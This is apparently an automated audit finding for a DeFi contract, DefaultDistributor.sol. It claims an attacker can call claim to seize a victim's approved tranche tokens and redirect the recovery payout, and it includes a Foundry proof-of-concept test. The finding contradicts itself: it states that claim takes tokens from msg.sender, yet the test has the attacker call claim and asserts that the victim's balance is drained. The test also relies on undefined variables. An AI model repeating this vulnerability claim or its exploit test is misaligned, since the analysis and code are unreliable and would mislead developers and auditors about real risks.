### Title
Unprivileged caller can redirect a lender’s default-recovery payout - ([File: `contracts/DefaultDistributor.sol`](contracts/DefaultDistributor.sol))

### Summary
`DefaultDistributor.claim` treats `msg.sender` as the tranche-token source but lets that caller choose an arbitrary payout recipient, so a victim’s ERC20 approval can be consumed by an attacker who receives the underlying recovery proceeds. [1](#0-0) 

### Finding Description
Once `isActive` is set, `claim` transfers the caller-approved tranche balance from `msg.sender` into the distributor and computes the underlying payout as `trancheBal * rate / ONE_TRANCHE`. [1](#0-0)   
The resulting tokens are sent to unrestricted parameter `_to` rather than the account whose tranche tokens were taken. [2](#0-1)   
There is no check that the beneficiary is the source account, nor is there a permit, signature, or other explicit owner authorization for a different beneficiary. [1](#0-0) 

### Impact Explanation
A lender that approves the distributor before claiming can have its entire tranche balance moved to the distributor while the corresponding recovery payout is sent to the attacker’s address. [1](#0-0)   
The stolen amount is `victimTrancheBalance * rate / 1e18`, capped by the victim’s tranche balance and available distributor funding. [3](#0-2)   
This violates one-receipt-one-payout because the owner supplies the defaulted tranche claim while an unrelated caller controls the payout destination. [1](#0-0) 

### Likelihood Explanation
The attack requires claims to be active and the victim to have granted the distributor sufficient tranche allowance, which is the normal prerequisite for a user-initiated claim. [1](#0-0)   
It can be executed by any externally owned account or contract between the victim’s approval and claim transactions, without owner, manager, borrower, or guardian privileges. [1](#0-0) 

### Recommendation
Remove the `_to` parameter and always pay `msg.sender`, or add an explicit owner-signed authorization when the payout recipient differs from the tranche source. [1](#0-0)   
If delegated claims must remain supported, use a `claimFor(source, to, signature)` design so ERC20 allowance alone cannot authorize redirection of proceeds. [1](#0-0) 

### Proof of Concept
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "../contracts/DefaultDistributor.sol";
import "../contracts/IdleCDOTranche.sol";
import "../contracts/interfaces/IERC20Detailed.sol";

contract DefaultDistributorClaimRedirectTest is Test {
  function testClaimPayoutCanBeRedirected() external {
    address owner = address(this);
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    // Fork/deployment context must provide the underlying token; this mock-like
    // token needs mint, approve and standard ERC20 transfer behavior.
    IERC20Detailed underlying = IERC20Detailed(defaultUnderlying);
    IdleCDOTranche tranche = IdleCDOTranche(AATranche);
    DefaultDistributor distributor = DefaultDistributor(defaultDistributorAA);

    uint256 victimTranches = 100 ether;
    uint256 recoveryFund = 60 ether;

    deal(address(tranche), victim, victimTranches);
    deal(defaultUnderlying, address(distributor), recoveryFund);

    distributor.setIsActive(true);
    assertEq(distributor.rate(), recoveryFund * 1e18 / tranche.totalSupply());

    // Required normal pre-claim approval.
    vm.prank(victim);
    tranche.approve(address(distributor), victimTranches);

    uint256 attackerBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    distributor.claim(attacker);

    assertEq(tranche.balanceOf(victim), 0);
    assertEq(tranche.balanceOf(address(distributor)), victimTranches);
    assertEq(
      underlying.balanceOf(attacker) - attackerBefore,
      victimTranches * distributor.rate() / 1e18
    );
  }
}
```
The key assertion is that `attacker` receives the recovery while `victim` supplies the approved tranche tokens, demonstrating theft equal to the victim’s full claim amount. [1](#0-0)
